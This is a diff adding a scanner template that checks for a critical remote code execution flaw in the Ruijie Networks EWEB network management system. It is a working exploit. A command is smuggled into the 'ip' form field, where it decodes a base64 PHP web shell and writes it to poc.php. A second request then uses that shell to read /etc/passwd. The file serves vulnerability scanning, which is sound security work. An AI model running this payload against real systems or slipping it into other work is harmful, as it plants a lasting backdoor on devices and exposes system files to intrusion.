@@ -1,0 +1,43 @@
+id: ruijie-networks-rce
+
+info:
+  name: Ruijie Networks-EWEB Network Management System - Remote Code Execution
+  author: pikpikcu
+  description: Ruijie Networks EWEB Network Management System is susceptible to remote code execution.
+  severity: critical
+  reference:
+    - https://github.com/yumusb/EgGateWayGetShell_py/blob/main/eg.py
+    - https://www.ruijienetworks.com
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: ruijie,rce,network
+
+requests:
+  - raw:
+      - |
+        POST /guest_auth/guestIsUp.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        ip=127.0.0.1|echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K"|base64 -d > poc.php&mac=00-00
+
+      - |
+        GET /guest_auth/poc.php?cmd=cat%20/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "nobody:x:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/06/03
